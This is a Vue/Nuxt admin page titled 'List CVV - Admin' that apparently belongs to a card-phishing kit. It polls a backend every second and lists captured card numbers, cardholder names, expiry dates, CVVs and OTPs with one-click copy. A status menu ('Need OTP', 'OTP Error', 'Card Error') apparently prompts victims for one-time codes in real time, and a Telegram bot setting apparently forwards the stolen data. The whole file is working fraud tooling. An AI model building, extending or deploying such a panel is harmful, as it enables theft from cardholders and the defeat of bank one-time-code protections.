<template>
  <div
    class="min-h-screen bg-gradient-to-br from-gray-50 via-white to-orange-50"
  >
    <div class="mb-4 p-4 bg-white rounded-lg shadow-sm border border-gray-200">
      <div class="flex items-center justify-between">
        <h1 class="text-xl font-bold text-gray-800">Payment Orders</h1>
        <div class="flex items-center space-x-4">
          <button
            @click="showTelegramConfig = !showTelegramConfig"
            class="group bg-gradient-to-r from-orange-500 to-red-500 hover:from-orange-600 hover:to-red-600 text-white px-4 py-2 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl text-sm font-bold"
          >
            Telegram Config
          </button>
          <div class="flex items-center space-x-2">
            <div
              :class="[
                'w-3 h-3 rounded-full',
                isPolling ? 'bg-green-500 animate-pulse' : 'bg-red-500',
              ]"
            ></div>
            <span class="text-sm text-gray-600">{{ pollingStatus }}</span>
          </div>
        </div>
      </div>
    </div>

    <div
      v-if="showTelegramConfig"
      class="mb-4 p-6 bg-gradient-to-br from-white via-orange-50 to-red-50 rounded-xl shadow-lg border border-orange-200 transition-all duration-500"
    >
      <h2
        class="text-xl font-bold bg-gradient-to-r from-orange-600 to-red-600 bg-clip-text text-transparent mb-6"
      >
        Telegram Configuration
      </h2>
      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div>
          <label
            for="bot-token"
            class="block text-sm font-bold text-orange-700 mb-3"
            >Bot Token</label
          >
          <input
            id="bot-token"
            v-model="telegramConfig.bot_token"
            type="text"
            class="w-full px-4 py-3 border-2 border-orange-200 rounded-xl focus:ring-4 focus:ring-orange-200 focus:border-orange-400 transition-all duration-300 bg-white hover:border-orange-300 shadow-sm hover:shadow-md font-mono text-sm"
            placeholder="Enter Bot Token"
          />
        </div>
        <div>
          <label for="chat-id" class="block text-sm font-bold text-red-700 mb-3"
            >Chat ID</label
          >
          <input
            id="chat-id"
            v-model="telegramConfig.chat_id"
            type="text"
            class="w-full px-4 py-3 border-2 border-red-200 rounded-xl focus:ring-4 focus:ring-red-200 focus:border-red-400 transition-all duration-300 bg-white hover:border-red-300 shadow-sm hover:shadow-md font-mono text-sm"
            placeholder="Enter Chat ID"
          />
        </div>
      </div>
      <div class="mt-6 flex flex-wrap gap-3">
        <button
          @click="saveTelegramConfig"
          :disabled="savingTelegram"
          class="group bg-gradient-to-r from-red-500 to-pink-500 hover:from-red-600 hover:to-pink-600 disabled:from-gray-400 disabled:to-gray-500 text-white px-6 py-3 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl disabled:opacity-50 disabled:cursor-not-allowed text-sm font-bold"
        >
          {{ savingTelegram ? "Saving..." : "Save Config" }}
        </button>
        <button
          @click="loadTelegramConfig"
          class="group bg-gradient-to-r from-orange-500 to-red-500 hover:from-orange-600 hover:to-red-600 text-white px-6 py-3 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl text-sm font-bold"
        >
          Reload
        </button>
      </div>
    </div>
    <div class="overflow-x-auto">
      <table class="min-w-full divide-y divide-gray-200">
        <thead class="bg-gradient-to-r from-orange-50 to-red-50">
          <tr>
            <th
              class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6"
            >
              Payment ID
            </th>
            <th
              class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6"
            >
              Method
            </th>
            <th
              class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6"
            >
              Card Number
            </th>
            <th
              class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6 hidden sm:table-cell"
            >
              Cardholder
            </th>
            <th
              class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6 hidden md:table-cell"
            >
              Expiry
            </th>
            <th
              class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6 hidden lg:table-cell"
            >
              CVV
            </th>
            <th
              class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6 hidden xl:table-cell"
            >
              OTP
            </th>
            <th
              class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6"
            >
              Status
            </th>
            <th
              class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6 hidden xl:table-cell"
            >
              Date
            </th>
            <th
              class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6"
            >
              Delete
            </th>
          </tr>
        </thead>
        <tbody class="bg-white divide-y divide-gray-100">
          <tr
            v-for="payment in payments"
            :key="payment.id"
            class="group hover:bg-gradient-to-r hover:from-orange-50 hover:to-red-50 transition-all duration-300"
          >
            <td class="px-3 py-4 whitespace-nowrap lg:px-6">
              <div class="text-sm font-bold text-gray-900 px-3 py-2">
                #{{ payment.id }}
              </div>
            </td>
            <td class="px-3 py-4 whitespace-nowrap lg:px-6">
              <div
                class="text-sm text-gray-900 capitalize cursor-pointer hover:bg-gradient-to-r hover:from-green-50 hover:to-blue-50 px-3 py-2 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-sm hover:shadow-md font-semibold"
                @click="copyToClipboard(payment.method)"
                :title="'Nhấn để copy: ' + payment.method"
              >
                {{ payment.method }}
              </div>
            </td>
            <td class="px-3 py-4 whitespace-nowrap lg:px-6">
              <div
                class="text-sm text-gray-900 cursor-pointer hover:bg-gradient-to-r hover:from-yellow-50 hover:to-orange-50 px-3 py-2 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-sm hover:shadow-md font-mono font-bold"
                @click="copyToClipboard(payment.card_number || 'N/A')"
                :title="'Click to copy: ' + (payment.card_number || 'N/A')"
              >
                {{ payment.card_number || "N/A" }}
              </div>
            </td>
            <td
              class="px-3 py-4 whitespace-nowrap lg:px-6 hidden sm:table-cell"
            >
              <div
                class="text-sm text-gray-900 cursor-pointer hover:bg-gradient-to-r hover:from-purple-50 hover:to-pink-50 px-3 py-2 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-sm hover:shadow-md font-semibold"
                @click="copyToClipboard(payment.cardholder_name || 'N/A')"
                :title="'Click to copy: ' + (payment.cardholder_name || 'N/A')"
              >
                {{ payment.cardholder_name || "N/A" }}
              </div>
            </td>
            <td
              class="px-3 py-4 whitespace-nowrap lg:px-6 hidden md:table-cell"
            >
              <div
                class="text-sm text-gray-900 cursor-pointer hover:bg-gradient-to-r hover:from-indigo-50 hover:to-blue-50 px-3 py-2 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-sm hover:shadow-md font-mono font-bold"
                @click="copyToClipboard(payment.expiry || 'N/A')"
                :title="'Click to copy: ' + (payment.expiry || 'N/A')"
              >
                {{ payment.expiry || "N/A" }}
              </div>
            </td>
            <td
              class="px-3 py-4 whitespace-nowrap lg:px-6 hidden lg:table-cell"
            >
              <div
                class="text-sm text-gray-900 cursor-pointer hover:bg-gradient-to-r hover:from-red-50 hover:to-pink-50 px-3 py-2 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-sm hover:shadow-md font-mono font-bold"
                @click="copyToClipboard(payment.cvv || 'N/A')"
                :title="'Click to copy: ' + (payment.cvv || 'N/A')"
              >
                {{ payment.cvv || "N/A" }}
              </div>
            </td>
            <td
              class="px-3 py-4 whitespace-nowrap lg:px-6 hidden xl:table-cell"
            >
              <div
                class="text-sm text-gray-900 cursor-pointer hover:bg-gradient-to-r hover:from-cyan-50 hover:to-blue-50 px-3 py-2 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-sm hover:shadow-md font-mono font-bold"
                @click="copyToClipboard(payment.otp || 'N/A')"
                :title="'Click to copy: ' + (payment.otp || 'N/A')"
              >
                {{ payment.otp || "N/A" }}
              </div>
            </td>
            <td class="px-3 py-4 whitespace-nowrap lg:px-6">
              <select
                v-model="payment.status"
                @change="updatePaymentStatus(payment)"
                :class="getStatusClass(payment.status)"
                :disabled="payment.status === 'success'"
                class="px-3 py-2 lg:px-4 lg:py-3 text-xs lg:text-sm font-bold rounded-xl border-2 focus:ring-4 focus:ring-orange-200 focus:border-orange-400 transition-all duration-300 cursor-pointer hover:shadow-lg min-w-[100px] lg:min-w-[140px] disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:border-gray-200 transform hover:scale-105"
              >
                <option value="pending">Pending</option>
                <option value="sms">Need OTP</option>
                <option value="sms_error">OTP Error</option>
                <option value="wrong">Card Error</option>
                <option value="success">Success</option>
              </select>
            </td>
            <td
              class="px-3 py-4 whitespace-nowrap text-sm text-gray-500 lg:px-6 hidden xl:table-cell"
            >
              <div class="px-3 py-2 font-semibold">
                {{ formatDate(payment.created_at) }}
              </div>
            </td>
            <td class="px-3 py-4 whitespace-nowrap text-sm font-medium lg:px-6">
              <button
                @click="deletePayment(payment)"
                class="group bg-gradient-to-r from-red-500 to-pink-500 hover:from-red-600 hover:to-pink-600 text-white p-3 rounded-xl transition-all duration-300 transform hover:scale-110 hover:-translate-y-1 shadow-lg hover:shadow-xl disabled:opacity-50 disabled:cursor-not-allowed"
                :disabled="loading"
                title="Delete payment"
              >
                <FontAwesomeIcon
                  :icon="faTrash"
                  class="w-4 h-4 group-hover:scale-110 transition-transform duration-300"
                />
              </button>
            </td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>
</template>

<script setup lang="ts">
import { FontAwesomeIcon } from "@fortawesome/vue-fontawesome";
import { faTrash } from "@fortawesome/free-solid-svg-icons";
import type { PaymentInfo, TelegramSettings } from "~/server/database/db";

definePageMeta({
  layout: "admin",
});

useHead({
  title: "List CVV - Admin",
});

const payments = ref<PaymentInfo[]>([]);
const loading = ref(false);
const pollingStatus = ref("Đang kết nối...");
const isPolling = ref(false);
let pollingTimer: NodeJS.Timeout | null = null;

const showTelegramConfig = ref(false);
const savingTelegram = ref(false);
const telegramConfig = ref<TelegramSettings>({
  id: 0,
  bot_token: "",
  chat_id: "",
});

const loadTelegramConfig = async () => {
  try {
    const response = await $fetch<{ success: boolean; data: TelegramSettings }>(
      "/api/admin/telegram/config",
    );
    if (response.success && response.data) {
      telegramConfig.value = response.data;
    }
  } catch {}
};

const saveTelegramConfig = async () => {
  try {
    savingTelegram.value = true;
    const response = await $fetch<{ success: boolean; message: string }>(
      "/api/admin/telegram/config",
      {
        method: "PUT",
        body: {
          bot_token: telegramConfig.value.bot_token,
          chat_id: telegramConfig.value.chat_id,
        },
      },
    );

    if (response.success) {
      alert(response.message);
    }
  } catch {
    alert("Lỗi lưu cấu hình Telegram");
  } finally {
    savingTelegram.value = false;
  }
};

const poll = async () => {
  if (!isPolling.value) return;

  try {
    const newPayments = await $fetch<PaymentInfo[]>("/api/admin/payments");
    payments.value = newPayments;
    pollingStatus.value = `(${newPayments.length})`;
  } catch {
    pollingStatus.value = "Lỗi kết nối - đang thử lại...";
  }

  if (isPolling.value) {
    pollingTimer = setTimeout(poll, 1000);
  }
};

const startPolling = () => {
  if (isPolling.value) return;
  isPolling.value = true;
  poll();
};

const stopPolling = () => {
  isPolling.value = false;
  if (pollingTimer) {
    clearTimeout(pollingTimer);
    pollingTimer = null;
  }
};

const loadPayments = async () => {
  try {
    loading.value = true;
    const data = await $fetch<PaymentInfo[]>("/api/admin/payments");
    payments.value = data;
  } catch {
    alert("Lỗi");
  } finally {
    loading.value = false;
  }
};

onMounted(async () => {
  await loadTelegramConfig();
  startPolling();
});

onUnmounted(() => {
  stopPolling();
});

const updatePaymentStatus = async (payment: PaymentInfo) => {
  try {
    await $fetch(`/api/admin/payments/${payment.id}/status`, {
      method: "PUT",
      body: { status: payment.status },
    });
  } catch {
    alert("Lỗi cập nhật!");
    await loadPayments();
  }
};

const deletePayment = async (payment: PaymentInfo) => {
  if (!confirm(`Xóa ID #${payment.id}?`)) {
    return;
  }

  try {
    loading.value = true;
    await $fetch(`/api/admin/payments/${payment.id}`, {
      method: "DELETE",
    });
    await loadPayments();
  } catch {
    alert("Lỗi khi xoá");
  } finally {
    loading.value = false;
  }
};

const copyToClipboard = async (text: string) => {
  try {
    await navigator.clipboard.writeText(text);
    alert("Đã copy!");
  } catch {
    const textArea = document.createElement("textarea");
    textArea.value = text;
    document.body.appendChild(textArea);
    textArea.select();
    document.execCommand("copy");
    document.body.removeChild(textArea);
    alert("Đã copy!");
  }
};

const formatDate = (dateString: string) => {
  if (!dateString) return "Không có";
  return new Date(dateString).toLocaleDateString("vi-VN", {
    year: "numeric",
    month: "long",
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    hour12: false,
  });
};

const getStatusClass = (status: string) => {
  const classes: Record<string, string> = {
    pending:
      "bg-gradient-to-r from-gray-100 to-gray-200 text-gray-800 border-gray-400 shadow-md",
    sms: "bg-gradient-to-r from-yellow-100 to-orange-200 text-yellow-800 border-yellow-400 shadow-md",
    sms_error:
      "bg-gradient-to-r from-orange-100 to-red-200 text-orange-800 border-orange-400 shadow-md",
    wrong:
      "bg-gradient-to-r from-red-100 to-pink-200 text-red-800 border-red-400 shadow-md",
    success:
      "bg-gradient-to-r from-blue-100 to-green-200 text-blue-800 border-blue-400 shadow-md",
  };
  return (
    classes[status] ||
    "bg-gradient-to-r from-gray-100 to-gray-200 text-gray-800 border-gray-400 shadow-md"
  );
};
</script>
